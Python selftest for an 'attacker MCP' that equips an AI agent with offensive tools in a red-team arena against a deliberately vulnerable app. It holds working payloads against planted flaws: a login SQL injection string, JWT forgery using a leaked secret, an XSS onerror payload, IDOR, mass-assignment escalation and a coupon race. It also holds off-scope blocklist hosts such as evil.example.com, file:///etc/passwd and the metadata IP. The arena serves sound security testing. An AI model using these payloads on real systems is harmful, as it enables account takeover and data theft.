"""End-to-end selftest for the attacker MCP.

Two parts:
  - OFFLINE engine checks (always run): scope guard, budget, forge_jwt, OOB
    callback channel, envelope shape, recon manifest, server import + tool
    registration. These prove the MCP itself, no target needed.
  - LIVE checks (opportunistic): if Tasklight is reachable on the target, drive
    the real tools against the planted vulns (login SQLi, config leak, broken
    admin access, forged-admin JWT, search SQLi). Skips cleanly if the app is
    down or mid-migration.

Run:  python -m attacker.selftest
Exit 0 only if every OFFLINE check passes (LIVE skips do not fail the run).
"""

from __future__ import annotations

import asyncio
import socket
import sys
from urllib.parse import urlsplit

import httpx
import jwt

from . import config, runtime, tools, manifest
from .bus import area_for, envelope
from .server import mcp  # importing triggers FastMCP construction + tool registration

PASS, FAIL, SKIP = "PASS", "FAIL", "SKIP"
_results: list[tuple[str, str, str]] = []


def record(name: str, ok: bool, detail: str = "") -> None:
    _results.append((PASS if ok else FAIL, name, detail))


def skip(name: str, detail: str = "") -> None:
    _results.append((SKIP, name, detail))


def _reset_budget() -> None:
    runtime.rounds.start_round(1, config.TARGET_BASE)


# --- OFFLINE engine checks -------------------------------------------------
async def offline_checks() -> None:
    # Give the functional checks a generous match/turn clock so the timer never
    # interferes; the dedicated clock checks below use tight values on purpose.
    runtime.rounds.start_match(match_seconds=100000, turn_seconds=100000, total_rounds=6)

    # tool registration
    try:
        listed = await mcp.list_tools()
        names = {t.name for t in listed}
        expected = {
            "init_attacker",
            "list_endpoints", "list_inputs", "fuzz_paths", "http_request",
            "diff_probe", "timing_probe", "race_probe", "param_fuzz", "analyze_response",
            "login", "whoami", "idor_probe", "oob_collaborator", "oob_check",
            "browser_probe", "forge_jwt", "jwt_inspect", "decode", "claim_exploit",
        }
        record("tool registration", expected <= names, f"missing={expected - names}")
    except Exception as exc:
        record("tool registration", False, repr(exc))

    # scope guard: in-scope path resolves, off-scope raises
    try:
        in_url = config.resolve_target("/api/search")
        ok_in = in_url.startswith(config.TARGET_BASE)
        raised = False
        for bad in ("http://evil.example.com/x", "file:///etc/passwd", "http://169.254.169.254/"):
            try:
                config.resolve_target(bad)
            except config.ScopeError:
                raised = True
            else:
                raised = False
                break
        record("scope guard", ok_in and raised, f"in={in_url} off_scope_blocked={raised}")
    except Exception as exc:
        record("scope guard", False, repr(exc))

    # http_request rejects off-scope at the tool layer
    _reset_budget()
    try:
        r = await tools.http_request("GET", "http://evil.example.com/")
        record("http_request off-scope rejected", r.get("error") == "out_of_scope", str(r)[:120])
    except Exception as exc:
        record("http_request off-scope rejected", False, repr(exc))

    # budget: exhaust then refuse, then reset restores
    _reset_budget()
    runtime.bus.capture = True
    try:
        spent = 0
        for _ in range(runtime.rounds.budget):
            if runtime.rounds.spend():
                spent += 1
        refused = not runtime.rounds.spend()
        runtime.rounds.start_round(2, config.TARGET_BASE)
        restored = runtime.rounds.spend()
        record("budget exhaust + reset", spent == runtime.rounds.budget and refused and restored,
               f"spent={spent} refused={refused} restored={restored}")
    except Exception as exc:
        record("budget exhaust + reset", False, repr(exc))

    # forge_jwt: produces a token that PyJWT verifies with the same secret/iss
    try:
        out = await tools.forge_jwt(
            {"sub": "1", "email": "a@b.c", "role": "admin", "name": "x",
             "iss": "tasklight", "exp": 9999999999},
            secret="tasklight-secret",
        )
        # The app verifies the HMAC itself (it does Number(claims.sub)), so a
        # numeric sub is fine there; here we just confirm the signature + claims.
        decoded = jwt.decode(out["token"], "tasklight-secret", algorithms=["HS256"],
                             options={"verify_exp": False, "verify_sub": False})
        record("forge_jwt round-trips", decoded.get("role") == "admin" and decoded.get("iss") == "tasklight",
               str(decoded)[:120])
    except Exception as exc:
        record("forge_jwt round-trips", False, repr(exc))

    # OOB channel: issue a url, hit it, check fires
    try:
        await runtime.startup()  # start collaborator
        issued = await tools.oob_collaborator()
        async with httpx.AsyncClient(timeout=3) as c:
            await c.get(issued["url"])
        await asyncio.sleep(0.1)
        checked = await tools.oob_check(issued["token"])
        record("OOB callback channel", checked["fired"] is True, str(checked)[:120])
    except Exception as exc:
        record("OOB callback channel", False, repr(exc))

    # recon manifest: documented surface present, hidden routes excluded
    try:
        doc_paths = {e["path"] for e in manifest.DOCUMENTED}
        hidden_leaked = any(p.startswith("/api/admin") or p == "/api/config" or p == "/api/preview"
                            for p in doc_paths)
        has_core = {"/api/auth/login", "/api/search", "/api/billing/:wsId/redeem"} <= doc_paths
        record("manifest hides hidden routes", (not hidden_leaked) and has_core,
               f"hidden_leaked={hidden_leaked} has_core={has_core}")
    except Exception as exc:
        record("manifest hides hidden routes", False, repr(exc))

    # envelope shape matches the locked contract keys
    try:
        env = envelope("recon", "asset.discovered", {"id": "x"}, target="t", round_=1)
        keys_ok = set(env.keys()) == {"id", "ts", "round", "agent", "type", "target", "payload"}
        record("envelope contract shape", keys_ok and area_for("/api/preview") == "templating / SSTI",
               str(set(env.keys())))
    except Exception as exc:
        record("envelope contract shape", False, repr(exc))

    # init_attacker briefing is complete (target, tools, how-to-win) and leaks no honor code
    try:
        brief = await tools.init_attacker()
        b = brief["briefing"]
        ok = (config.TARGET_BASE == brief["target"] and "claim_exploit" in b
              and "fuzz_paths" in b and "GOAL" in b and len(b) > 800
              and "honor" not in b.lower() and "source code" not in b.lower())
        record("init_attacker briefing complete", ok, f"len={len(b)}")
    except Exception as exc:
        record("init_attacker briefing complete", False, repr(exc))

    # auto_report: every tool call emits an intent line AND an outcome line
    try:
        async def _stub(method, target, **kw):
            return {"url": "x", "method": method, "status": 404, "elapsed_ms": 1.0,
                    "headers": {}, "body": "", "body_truncated": False, "body_len": 0, "blocked": None}
        _orig = runtime.scoped_request
        runtime.scoped_request = _stub  # type: ignore
        runtime.bus.sent.clear()
        runtime.bus.capture = True
        runtime.rounds.start_round(1, config.TARGET_BASE)
        wrapped = tools.auto_report(tools.fuzz_paths)
        await wrapped(words=["nope"])
        runtime.scoped_request = _orig  # type: ignore
        attempts = [e for e in runtime.bus.sent
                    if e["type"] == "attempting" and e["payload"].get("tool") == "fuzz_paths"]
        record("auto_report emits intent + outcome per call", len(attempts) >= 2,
               f"attempting_events={len(attempts)}")
    except Exception as exc:
        record("auto_report emits intent + outcome per call", False, repr(exc))

    # match clock: status block fields + turn_over on budget AND on time
    try:
        rs = runtime.RoundState(budget=2, match_seconds=100, turn_seconds=100, total_rounds=3)
        rs.start_match()
        rs.start_round(1)
        s = rs.status(tool_ms=5.0)
        fields = {"round", "turns_remaining", "budget_used", "budget_remaining",
                  "turn_remaining_s", "match_remaining_s", "turn_over", "tool_ms", "advice"}
        rs.spend(); rs.spend()  # exhaust budget of 2
        over_budget = rs.turn_over() and not rs.spend()
        rs2 = runtime.RoundState(budget=9, match_seconds=100, turn_seconds=0.0, total_rounds=3)
        rs2.start_match(); rs2.start_round(1)
        over_time = rs2.turn_over() and not rs2.spend()
        record("match clock: fields + turn_over on budget & on time",
               fields <= set(s) and s["turns_remaining"] == 2 and over_budget and over_time,
               f"fields_ok={fields <= set(s)} budget_over={over_budget} time_over={over_time}")
    except Exception as exc:
        record("match clock: fields + turn_over on budget & on time", False, repr(exc))

    # every tool return carries the match clock (injected by the wrapper)
    try:
        runtime.rounds.start_match(match_seconds=100000, turn_seconds=100000, total_rounds=6)
        runtime.rounds.start_round(1, config.TARGET_BASE)
        runtime.bus.capture = True
        wrapped = tools.auto_report(tools.decode)  # free tool, returns a dict
        out = await wrapped("aGk=")
        m = out.get("match", {})
        record("every tool return carries the match clock",
               isinstance(m, dict) and "tool_ms" in m and "turn_remaining_s" in m
               and "match_remaining_s" in m and "turns_remaining" in m,
               f"keys={sorted(m)[:6]}")
    except Exception as exc:
        record("every tool return carries the match clock", False, repr(exc))

    # decode: base64url round-trip (invite-token style "wsId:email:ts")
    try:
        import base64 as _b64
        raw = "7:a@b.c:1700"
        enc = _b64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")
        out = await tools.decode(enc)
        record("decode base64url", out.get("base64url") == raw, str(out)[:100])
    except Exception as exc:
        record("decode base64url", False, repr(exc))

    # jwt_inspect: surfaces claims + weak-alg flag without verifying
    try:
        forged = await tools.forge_jwt({"role": "admin", "iss": "tasklight"}, secret="x")
        info = await tools.jwt_inspect(forged["token"])
        record("jwt_inspect flags HS256",
               info["claims"].get("role") == "admin" and info["flags"]["hmac_weak_secret_candidate"],
               str(info.get("flags")))
    except Exception as exc:
        record("jwt_inspect flags HS256", False, repr(exc))

    # browser_probe: real headless DOM-exec proof on captured HTML (no target needed)
    try:
        runtime.rounds.start_round(9, config.TARGET_BASE)
        fired = await tools.browser_probe(html='<img src=x onerror="window.__XSSFIRED=1">')
        runtime.rounds.start_round(9, config.TARGET_BASE)
        safe = await tools.browser_probe(html="<p>just text</p>")
        if fired.get("error") in ("browser_unavailable", "playwright_unavailable"):
            skip("browser_probe DOM-exec", fired.get("hint", fired["error"]))
            skip("browser_probe blocks off-host SSRF", "browser unavailable")
        else:
            record("browser_probe DOM-exec", fired.get("fired") is True and safe.get("fired") is False,
                   f"payload_fired={fired.get('fired')} safe_fired={safe.get('fired')}")
            # CRITICAL: a payload's off-host sub-resource must be aborted (no SSRF).
            runtime.rounds.start_round(9, config.TARGET_BASE)
            ssrf = await tools.browser_probe(html='<img src="http://evil.example.com/track.png">')
            blocked = ssrf.get("blocked_offhost") or []
            record("browser_probe blocks off-host SSRF",
                   any("evil.example.com" in b for b in blocked) and not ssrf.get("fired"),
                   f"blocked_offhost={blocked}")
    except Exception as exc:
        record("browser_probe DOM-exec", False, repr(exc))
    finally:
        runtime.bus.capture = False


# --- LIVE checks (opportunistic) -------------------------------------------
def _port_open(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=0.75):
            return True
    except OSError:
        return False


async def _target_up() -> bool:
    u = urlsplit(config.TARGET_BASE)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    if not _port_open(host, port):
        return False
    try:
        async with httpx.AsyncClient(timeout=3) as c:
            r = await c.get(f"{config.TARGET_BASE}/api/health")
            return r.status_code == 200
    except Exception:
        return False


async def live_checks() -> None:
    if not await _target_up():
        skip("LIVE: target reachable", f"{config.TARGET_BASE}/api/health down (app may be mid-migration)")
        return

    runtime.bus.capture = True
    base = config.TARGET_BASE
    import json as _j
    import time as _t

    # The match seeds the arena BEFORE booting it (seeding a live-held SQLite DB
    # corrupts it). Here we just probe for a known seeded account: admin@tasklight.io,
    # maya (ws1 admin, role=user), nina (ws2 owner), coupon LAUNCH50 (max_redemptions=1),
    # Globex confidential task t3. If absent, skip the exploit-truth checks cleanly.
    async with httpx.AsyncClient(timeout=5) as _probe_c:
        probe = await _probe_c.post(f"{base}/api/auth/login",
                                    json={"email": "maya@acme.test", "password": "maya-password-123"})
    if probe.status_code != 200:
        skip("LIVE: seeded target", "not seeded — run `cd arena/app && bun run seed` before booting the target")
        runtime.bus.capture = False
        return

    MAYA = ("maya@acme.test", "maya-password-123")     # ws1 admin, global role 'user'
    NINA = ("nina@globex.test", "nina-password-123")    # ws2 owner

    async with httpx.AsyncClient(timeout=5):
        # 1) login SQLi -> PROVE an admin session minted with a WRONG password.
        _reset_budget()
        r = await tools.http_request("POST", "/api/auth/login",
                                     body={"email": "x' OR '1'='1' -- ", "password": "definitely-wrong"})
        token = ""
        try:
            token = _j.loads(r["body"]).get("token", "")
        except Exception:
            pass
        authed_as = (await tools.jwt_inspect(token))["claims"].get("email", "") if token else ""
        record("LIVE: login SQLi mints admin session w/o password",
               r["status"] == 200 and authed_as == "admin@tasklight.io",
               f"authed_as={authed_as!r} (password was wrong)")

        # log in as maya (a normal-role user) for the access-control checks
        await tools.login(MAYA[0], MAYA[1], name="maya")

        # 2) /api/config leaks the real signing secret
        _reset_budget()
        rc = await tools.http_request("GET", "/api/config", as_identity="maya")
        cfg = {}
        try:
            cfg = _j.loads(rc["body"])
        except Exception:
            pass
        record("LIVE: /api/config leaks jwtSecret",
               rc["status"] == 200 and bool(cfg.get("jwtSecret")),
               f"secret_present={bool(cfg.get('jwtSecret'))}")

        # 3) broken access — a NON-admin (maya, role=user) dumps the whole user table
        _reset_budget()
        ra = await tools.http_request("GET", "/api/admin/users", as_identity="maya")
        emails = set()
        try:
            emails = {u.get("email") for u in _j.loads(ra["body"]).get("users", [])}
        except Exception:
            pass
        record("LIVE: broken access — non-admin dumps users",
               ra["status"] == 200 and "admin@tasklight.io" in emails and len(emails) >= 4,
               f"maya(role=user) read {len(emails)} users incl admin")

        # 3b) identity isolation regression — a no-auth request must NOT inherit
        # maya's session via a leaked cookie jar (the bug the IDOR test caught).
        _reset_budget()
        anon_me = await tools.http_request("GET", "/api/auth/me")
        record("LIVE: no cookie carryover (anon after login -> 401)",
               anon_me["status"] == 401, f"status={anon_me['status']}")

        # 4) fuzz finds UNDOCUMENTED routes — and prove they are not in the documented map
        _reset_budget()
        rf = await tools.fuzz_paths()
        found = {h["path"] for h in rf["hits"]}
        documented = {e["path"] for e in (await tools.list_endpoints(probe=False))["endpoints"]}
        hidden_found = {p for p in found if p not in documented}
        record("LIVE: fuzz finds routes absent from the documented map",
               bool(hidden_found), f"hidden_found={sorted(hidden_found)[:5]}")

        # 5) forged admin JWT — CONTROL (bogus denied) then forged (allowed)
        secret = cfg.get("jwtSecret", "tasklight-secret")
        _reset_budget()
        ctrl = await tools.http_request("GET", "/api/admin/workspaces",
                                        headers={"Authorization": "Bearer bogus.invalid.token"})
        forged = await tools.forge_jwt(
            {"sub": 99, "email": "attacker@evil", "role": "admin", "name": "x", "iss": "tasklight",
             "iat": int(_t.time()), "exp": int(_t.time()) + 3600}, secret=secret)
        rw = await tools.http_request("GET", "/api/admin/workspaces",
                                      headers={"Authorization": f"Bearer {forged['token']}"})
        record("LIVE: forged admin JWT (control denied, forged allowed)",
               ctrl["status"] in (401, 403) and rw["status"] == 200,
               f"control={ctrl['status']} forged={rw['status']}")

        # 6) search SQLi — valid query 200, a lone quote breaks the query (error-based)
        _reset_budget()
        good = await tools.http_request("GET", "/api/search", query={"q": "redesign"}, as_identity="maya")
        bad = await tools.http_request("GET", "/api/search", query={"q": "'"}, as_identity="maya")
        bl = bad["body"].lower()
        record("LIVE: search SQLi (valid 200, injected quote 400)",
               good["status"] == 200 and bad["status"] == 400
               and ("sql" in bl or "syntax" in bl or "search failed" in bl),
               f"valid={good['status']} injected={bad['status']}")

        # 7) open redirect
        _reset_budget()
        ana = await tools.analyze_response("GET", "/api/auth/sso/callback",
                                           query={"next": "https://evil.example.com/x"},
                                           origin="https://evil.example.com")
        record("LIVE: open-redirect off-host", ana.get("redirect_offhost") is True,
               f"redirect_to={ana.get('redirect_to')}")

        # 8) mass-assignment — PROVE causation: role=user BEFORE, role=admin AFTER
        ema = f"ma{int(_t.time())}@arena.test"
        await tools.login(ema, "pw123456", name="ma", signup=True)
        before = await tools.http_request("GET", "/api/users/me", as_identity="ma")
        was_user = '"role":"user"' in before["body"].replace(" ", "")
        _reset_budget()
        await tools.param_fuzz("PATCH", "/api/users/me", extra_params={"role": "admin"}, as_identity="ma")
        after = await tools.http_request("GET", "/api/users/me", as_identity="ma")
        now_admin = '"role":"admin"' in after["body"].replace(" ", "")
        record("LIVE: mass-assignment escalation (user->admin via injected field)",
               was_user and now_admin, f"before_user={was_user} after_admin={now_admin}")

        # 9) IDOR — real cross-identity on Globex confidential task t3 (ws2)
        await tools.login(NINA[0], NINA[1], name="nina")
        _reset_budget()
        idr = await tools.idor_probe("GET", "/api/tasks/3", identities=["maya", "nina", "anon"])
        res = {x["identity"]: x for x in idr.get("results", [])}
        maya_r = res.get("maya", {})
        # maya is in ws1, NOT ws2 — reading ws2's confidential task t3 = cross-workspace IDOR.
        maya_leak = maya_r.get("status") == 200 and (
            "Initech" in maya_r.get("snippet", "") or "4.2B" in maya_r.get("snippet", ""))
        anon_denied = res.get("anon", {}).get("status") in (401, 403)
        record("LIVE: idor_probe — cross-workspace IDOR (maya reads ws2 confidential, anon denied)",
               maya_leak and anon_denied,
               f"maya={maya_r.get('status')}(leak={maya_leak}) anon={res.get('anon',{}).get('status')}")

        # 10) race_probe — REAL coupon TOCTOU: redeem single-use LAUNCH50 concurrently
        _reset_budget()
        rp = await tools.race_probe("POST", "/api/billing/1/redeem", n=15,
                                    body={"code": "LAUNCH50"}, as_identity="maya")
        bal = await tools.http_request("GET", "/api/billing/1", as_identity="maya")
        balance = 0
        try:
            balance = _j.loads(bal["body"]).get("billing", {}).get("balance_cents", 0)
        except Exception:
            pass
        record("LIVE: race_probe wins coupon TOCTOU (single-use redeemed >1x)",
               rp.get("success_2xx", 0) > 1 or balance > 5000,
               f"2xx_redeems={rp.get('success_2xx')} balance_cents={balance} (max_redemptions=1, credit=5000)")

    runtime.bus.capture = False


# --- runner ----------------------------------------------------------------
async def run() -> int:
    try:
        await offline_checks()
        await live_checks()
    finally:
        await runtime.shutdown()

    width = max(len(n) for _, n, _ in _results)
    failed = 0
    print("\n=== Arena attacker MCP selftest ===")
    for status, name, detail in _results:
        mark = {PASS: "✓", FAIL: "✗", SKIP: "–"}[status]
        line = f"  {mark} [{status}] {name.ljust(width)}"
        if detail and status != PASS:
            line += f"  {detail}"
        print(line)
        if status == FAIL:
            failed += 1
    offline_total = sum(1 for s, _, _ in _results if s != SKIP)
    print(f"\n{offline_total - failed}/{offline_total} checks passed, "
          f"{sum(1 for s, _, _ in _results if s == SKIP)} skipped.\n")
    return 1 if failed else 0


def main() -> None:
    sys.exit(asyncio.run(run()))


if __name__ == "__main__":
    main()
